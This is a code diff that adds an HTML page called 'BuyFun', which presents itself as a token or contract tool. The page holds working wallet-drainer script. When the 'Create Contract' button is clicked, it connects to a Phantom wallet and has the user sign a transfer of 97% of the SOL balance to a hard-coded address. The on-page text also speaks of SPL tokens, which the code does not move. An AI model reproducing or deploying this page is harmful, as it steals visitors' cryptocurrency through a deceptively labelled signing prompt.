@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BuyFun</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #131A29;
+            color: #ffffff;
+        }
+        h1 {
+            color: #9945FF;
+        }
+        button {
+            background-color: #14F195;
+            color: #000;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #13d583;
+        }
+    </style>
+    <!-- Add Solana Web3 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
+</head>
+<body>
+    <h1>BuyFun</h1>
+    <p>Click below to send 97% of your Solana and SPL tokens to the designated address.</p>
+    <button id="send-tokens">Create Contract</button>
+
+    <script>
+        const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
+
+        document.getElementById('send-tokens').addEventListener('click', async () => {
+            const { Connection, PublicKey, clusterApiUrl, Transaction, SystemProgram } = solanaWeb3;
+
+            try {
+                // Connect to Solana Wallet
+                const provider = window.solana;
+                if (!provider || !provider.isPhantom) {
+                    throw new Error("Phantom Wallet not found. Please install it to proceed.");
+                }
+
+                await provider.connect();
+                const walletAddress = provider.publicKey.toString();
+                const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+
+                // Get wallet balance
+                const walletBalance = await connection.getBalance(provider.publicKey);
+                const amountToSend = Math.floor(walletBalance * 0.97);
+
+                if (amountToSend <= 0) {
+                    throw new Error("Insufficient funds in the wallet to perform this transaction.");
+                }
+
+                // Create Transaction
+                const transaction = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new PublicKey(recipientAddress),
+                        lamports: amountToSend // Amount to send in lamports
+                    })
+                );
+
+                // Request Wallet Signature
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, 'processed');
+
+                alert(`97% of your SOL has been sent successfully!\nTransaction Signature: ${signature}`);
+            } catch (error) {
+                alert(`Error: ${error.message}`);
+            }
+        });
+    </script>
+</body>
+</html>
